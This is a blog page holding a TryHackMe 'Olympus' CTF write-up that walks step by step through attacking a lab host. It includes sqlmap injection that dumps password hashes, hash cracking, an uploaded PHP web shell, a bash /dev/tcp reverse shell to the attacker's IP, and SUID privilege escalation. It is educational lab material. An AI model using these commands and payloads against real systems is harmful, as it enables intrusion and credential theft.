<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="üìÜ 01/10/2022 - geobour98 ‚åö 10 min
Introduction This is a TryHackMe room which can be found at: Olympus
My first CTF !
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/olympus/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=logo.png><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Olympus"><meta property="og:description" content="üìÜ 01/10/2022 - geobour98 ‚åö 10 min
Introduction This is a TryHackMe room which can be found at: Olympus
My first CTF !
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/olympus/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Olympus"><meta name=twitter:description content="üìÜ 01/10/2022 - geobour98 ‚åö 10 min
Introduction This is a TryHackMe room which can be found at: Olympus
My first CTF !
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Olympus","item":"https://geobour98.com/write-ups/thm/olympus/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Olympus","name":"TryHackMe - Olympus","description":"üìÜ 01/10/2022 - geobour98 ‚åö 10 min\nIntroduction This is a TryHackMe room which can be found at: Olympus\nMy first CTF !\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0.","keywords":[],"articleBody":"üìÜ 01/10/2022 - geobour98 ‚åö 10 min\nIntroduction This is a TryHackMe room which can be found at: Olympus\nMy first CTF !\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.203.170  geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:38 EEST Initiating Ping Scan at 14:38 Scanning 10.10.203.170 [2 ports] Completed Ping Scan at 14:38, 0.07s elapsed (1 total hosts) Initiating Connect Scan at 14:38 Scanning olympus.thm (10.10.203.170) [65535 ports] Discovered open port 22/tcp on 10.10.203.170 Discovered open port 80/tcp on 10.10.203.170 Completed Connect Scan at 14:39, 34.39s elapsed (65535 total ports) Nmap scan report for olympus.thm (10.10.203.170) Host is up (0.069s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 34.51 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 10.10.203.170  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.203.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 14:39 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating NSE at 14:39 Completed NSE at 14:39, 0.00s elapsed Initiating Ping Scan at 14:39 Scanning 10.10.203.170 [4 ports] Completed Ping Scan at 14:39, 0.11s elapsed (1 total hosts) Initiating SYN Stealth Scan at 14:39 Scanning olympus.thm (10.10.203.170) [2 ports] Discovered open port 80/tcp on 10.10.203.170 Discovered open port 22/tcp on 10.10.203.170 Completed SYN Stealth Scan at 14:39, 0.11s elapsed (2 total ports) Initiating Service scan at 14:39 Scanning 2 services on olympus.thm (10.10.203.170) Completed Service scan at 14:39, 6.19s elapsed (2 services on 1 host) Initiating OS detection (try #1) against olympus.thm (10.10.203.170) Retrying OS detection (try #2) against olympus.thm (10.10.203.170) Initiating Traceroute at 14:39 Completed Traceroute at 14:39, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 14:39 Completed Parallel DNS resolution of 1 host. at 14:39, 0.00s elapsed NSE: Script scanning 10.10.203.170. Initiating NSE at 14:39 Completed NSE at 14:40, 2.14s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.28s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Nmap scan report for olympus.thm (10.10.203.170) Host is up (0.068s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA) | 256 8d:56:01:ca:55üá©üá™e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA) |_ 256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Olympus |_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 26.420 days (since Sun Aug 28 04:35:21 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 67.93 ms 10.8.0.1 (10.8.0.1) 2 68.02 ms olympus.thm (10.10.203.170)  NSE: Script Post-scanning. Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Initiating NSE at 14:40 Completed NSE at 14:40, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds  Raw packets sent: 60 (4.236KB) | Rcvd: 42 (3.136KB) If we navigate to port 80, the page is not loading so we can curl, in verbose mode, to identify the domain name of the machine.   Command: curl -v 10.10.203.170  geobour98@kali:~$ curl -v 10.10.203.170 [REDACTED] [REDACTED] We found that the domain name is olympus.thm, so we can add it and its IP address in /etc/hosts file. The contents of /etc/hosts should look like this:\ngeobour98@kali:~$ cat /etc/hosts [REDACTED] 10.10.203.170 olympus.thm [REDACTED] Then, we can navigate to http://olympus.thm and see the web page. Now, we can brute force the website for directories using gobuster.   Command: gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50  geobour98@kali:~$ gobuster dir -u http://olympus.thm/ -x php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://olympus.thm/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2022/09/22 22:33:40 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 276] /.htpasswd.php (Status: 403) [Size: 276] /.htaccess (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htaccess.php (Status: 403) [Size: 276] /.hta.php (Status: 403) [Size: 276] /index.php (Status: 200) [Size: 1948] /index.php (Status: 200) [Size: 1948] /javascript (Status: 301) [Size: 315] [-- http://olympus.thm/javascript/] /phpmyadmin (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /static (Status: 301) [Size: 311] [-- http://olympus.thm/static/] /~webmaster (Status: 301) [Size: 315] [-- http://olympus.thm/~webmaster/]  =============================================================== 2022/09/22 22:33:58 Finished =============================================================== The most interesting directory is ~webmaster, so we can go to the URL: http://olympus.thm/~webmaster/ Exploitation Flag 1 After trying the searchsploit command for exploits on Victor CMS, we identify Victor CMS 1.0 - 'Search' SQL Injection (php/webapps/48734.txt), which is a SQL Injection on search parameter. There is an exploit command with sqlmap tool. We first list the available databases, then its tables, then the columns of flag table, and finally dump the flag column.\ngeobour98@kali:~$ searchsploit victor [REDACTED] Victor CMS 1.0 - 'Search' SQL Injection | php/webapps/48734.txt [REDACTED] geobour98@kali:~$ searchsploit -m php/webapps/48734.txt geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch --dbs [REDACTED] available databases [6]: [*] information_schema [*] mysql [*] olympus [*] performance_schema [*] phpmyadmin [*] sys [REDACTED] geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus --tables [REDACTED] Database: olympus [6 tables] +------------+ | categories | | chats | | comments | | flag | | posts | | users | +------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T flag --columns [REDACTED] Database: olympus Table: flag [1 column] +--------+--------------+ | Column | Type | +--------+--------------+ | flag | varchar(255) | +--------+--------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T flag -C flag --dump Database: olympus Table: flag [1 entry] +---------------------------+ | flag | +---------------------------+ | [REDACTED] | +---------------------------+ Flag 2 There is another interesting table found from sqlmap, which is users and in the user_email column we can find another domain used chat.olympus.thm, so we add this too to /etc/hosts.\ngeobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T users --columns [REDACTED] Database: olympus Table: users [9 columns] +----------------+--------------+ | Column | Type | +----------------+--------------+ | randsalt | varchar(255) | | user_email | varchar(255) | | user_firstname | varchar(255) | | user_id | int | | user_image | text | | user_lastname | varchar(255) | | user_name | varchar(255) | | user_password | varchar(255) | | user_role | varchar(255) | +----------------+--------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T users -C randsalt,user_email,user_name,user_password --dump [REDACTED] Database: olympus Table: users [3 entries] +----------+------------------------+------------+--------------------------------------------------------------+ | randsalt | user_email | user_name | user_password | +----------+------------------------+------------+--------------------------------------------------------------+ |  | prometheus@olympus.thm | prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | | dgas | root@chat.olympus.thm | root | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | | dgas | zeus@chat.olympus.thm | zeus | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | +----------+------------------------+------------+--------------------------------------------------------------+ [REDACTED] geobour98@kali:~$ cat /etc/hosts [REDACTED] 10.10.203.170 olympus.thm chat.olympus.thm [REDACTED] If we navigate to http://chat.olympus.thm we see a login page. Before, we found some hashes so it‚Äôs time to crack them. We will use john for the first hash $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C, which is saved in file hash, with rockyou.txt wordlist.   Command: john -w=/usr/share/wordlists/rockyou.txt hash --format=bcrypt  geobour98@kali:~$ john -w=/usr/share/wordlists/rockyou.txt hash --format=bcrypt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 12 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status [REDACTED] (?) 1g 0:00:00:07 DONE (2022-09-22 23:33) 0.1386g/s 569.2p/s 569.2c/s 569.2C/s 19861986..candies Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Now we can login with username prometheus and the found password on the chat application (http://chat.olympus.thm). There is an upload functionality, so we upload cmd.php with contents:\nphp system($_REQUEST['cmd']); ?We don‚Äôt know where the file is uploaded to, so we can run gobuster.\n  Command: gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50  geobour98@kali:~$ gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 50 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://chat.olympus.thm/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/23 00:03:00 Starting gobuster in directory enumeration mode =============================================================== /.htaccess (Status: 403) [Size: 281] /.hta (Status: 403) [Size: 281] /.htpasswd (Status: 403) [Size: 281] /index.php (Status: 302) [Size: 0] [-- login.php] /javascript (Status: 301) [Size: 325] [-- http://chat.olympus.thm/javascript/] /phpmyadmin (Status: 403) [Size: 281] /server-status (Status: 403) [Size: 281] /static (Status: 301) [Size: 321] [-- http://chat.olympus.thm/static/] /uploads (Status: 301) [Size: 322] [-- http://chat.olympus.thm/uploads/]  =============================================================== 2022/09/23 00:03:11 Finished =============================================================== The file cmd.php should be at http://chat.olympus.thm/uploads/cmd.php, but there was another table called chats, which contains important information: The IT guy used a random file name function to make it harder for attackers to access the uploaded files. So we have to rerun sqlmap in order to view the file name of our uploaded file.\ngeobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T chats -C dt,file,msg,uname --dump [REDACTED] Database: olympus Table: chats [3 entries] +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | dt | file | msg  | uname | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt  | prometheus | | 2022-04-05 |  | This looks great! I tested an upload and found the upload folder , but it seems the filename got changed somehow because I can't download it back... | prometheus | | 2022-04-06 |  | I know this is pretty cool. The IT guy used a random file name f unction to make it harder for attackers to access the uploaded files. He's still working on it. | zeus | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ [REDACTED] geobour98@kali:~$ sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*\u0026submit=\" --random-agent -v 3 --batch -D olympus -T chats -C dt,file,msg,uname --dump --flush-session [REDACTED] Database: olympus Table: chats [13 entries] +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | dt | file | msg  | uname | +------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ | 2022-04-05 | 47c3210d51761686f3af40a875eeaaea.txt | Attached : prometheus_password.txt  | prometheus | | 2022-04-05 |  | This looks great! I tested an upload and found the upload folder , but it seems the filename got changed somehow because I can't download it back... | prometheus | | 2022-04-06 |  | I know this is pretty cool. The IT guy used a random file name f unction to make it harder for attackers to access the uploaded files. He's still working on it. | zeus | | 2022-09-23 |  |   | prometheus | | 2022-09-23 | c892fb409f85b25008b9d49da321df68.php | Attached : cmd.php  | prometheus | -------------+--------------------------------------+----------------------------------------------------------------- ------------------------------------------------------------------------------------------------+------------+ [REDACTED] Now in order to verify code execution navigate to: http://chat.olympus.thm/uploads/c892fb409f85b25008b9d49da321df68.php?cmd=id and the output is: uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web). Now we are going to get a reverse shell using Burp Suite. We Intercept the previous request, and execute a bash reverse shell like the following: bash -c 'exec bash -i \u0026/dev/tcp/10.8.200.50/443 , but it has to be URL-encoded. The request in Burp should look like this:\nGET /uploads/c892fb409f85b25008b9d49da321df68.php?cmd=bash+-c+'exec+bash+-i+%26/dev/tcp/10.8.200.50/443+ HTTP/1.1 Host: chat.olympus.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=lh3nk5s6r2577v8flvr9td45b6 Upgrade-Insecure-Requests: 1 Open a netcat listener and we have reverse shell as www-data.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.203.170] 58780 bash: cannot set terminal process group (777): Inappropriate ioctl for device bash: no job control in this shell www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 'import pty;pty.spawn(\"/bin/bash\")' www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ export TERM=xterm-256color www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ stty rows 38 cols 111 www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ whoami www-data www-data@olympus:/var/www/chat.olympus.thm/public_html/uploads$ id uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web) Then navigate to /home/zeus and open user.flag.\nwww-data@olympus:/home/zeus$ cat user.flag [REDACTED] Flag 3 Download linpeas.sh from PEASS-ng github page (https://github.com/carlospolop/PEASS-ng/releases/tag/20220918) and transfer it to the victim machine.\nwww-data@olympus:/dev/shm$ chmod +x linpeas.sh www-data@olympus:/dev/shm$ ./linpeas.sh [REDACTED] ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms ‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils (Unknown SUID binary) [REDACTED] There is an interesting SUID binary (/usr/bin/cputils), that provides copy functionality. In /home/zeus there was a folder .ssh, that should contain the private key of user zeus. So, we can copy it to /dev/shm/ and transfer it our machine in order to login as zeus.\nwww-data@olympus:/dev/shm$ /usr/bin/cputils  ____ ____ _ _ _  / ___| _ \\ _ _| |_(_) |___ | | | |_) | | | | __| | / __| | |___| __/| |_| | |_| | \\__ \\  \\____|_| \\__,_|\\__|_|_|___/  Enter the Name of Source File: /home/zeus/.ssh/id_rsa  Enter the Name of Target File: /dev/shm/id_rsa  File copied successfully. The id_rsa is password protected, so we can generate a hash of the file with ssh2john.py, then crack the hash with john and login as zeus with SSH, after modifying the permissions of the id_rsa.\ngeobour98@kali:~$ python /usr/share/john/ssh2john.py id_rsa  id_rsa.hash geobour98@kali:~$ john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 16 for all loaded hashes Will run 12 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status [REDACTED] (id_rsa) 1g 0:00:00:13 DONE (2022-09-23 13:14) 0.07558g/s 116.0p/s 116.0c/s 116.0C/s rachelle..mexico1 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. geobour98@kali:~$ chmod 600 id_rsa geobour98@kali:~$ ssh -i id_rsa zeus@10.10.203.170 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) [REDACTED] zeus@olympus:~$ id uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev) Now we are the user zeus.\nPrivilege Escalation There is an interesting folder (0aB44fdS3eDnLkpsz3deGv8TttR4sc) in /var/www/html that user zeus can access, which is owned by root. If we navigate there we see an interesting file VIGQFQFMYOST.php\nzeus@olympus:/$ cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/ zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php [REDACTED] $suid_bd = \"/lib/defended/libc.so.99\"; $shell = \"uname -a; w; $suid_bd\"; [REDACTED] The file /lib/defended/libc.so.99 is SUID binary, and if we execute the strings command we see that it executes /bin/sh, so we can run it to become root.\nzeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la /lib/defended/libc.so.99 -rwsr-xr-x 1 root root 16784 Apr 14 10:54 /lib/defended/libc.so.99 zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ strings /lib/defended/libc.so.99 [REDACTED] /bin/sh [REDACTED] zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ /lib/defended/libc.so.99 # id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus) We can read now root.flag in /root directory, and there is a hint on the 4th flag.\n# bash root@olympus:/root# cat root.flag  [REDACTED]  PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)   (Hint : regex can be usefull) Flag 4 The hint on TryHackMe‚Äôs page says that the 4th flag is located somewhere in /etc/ so we navigate there and use grep, to search recursively and ignore case sensitivity for the string flag{.\nroot@olympus:/root# cd /etc/ root@olympus:/etc# grep -Ri \"flag{\" ssl/private/.b0nus.fl4g:[REDACTED] ssl/private/.b0nus.fl4g:grep -irl flag{ Proof of Concept (PoC image): ","wordCount":"2610","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/olympus/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Olympus</h1><div class=post-meta></div></header><div class=post-content><p>üìÜ 01/10/2022 - geobour98<br>‚åö 10 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/olympusroom target=_blank style=color:#e30f0f>Olympus</a></p><p>My first CTF !</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.203.170</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.203.170
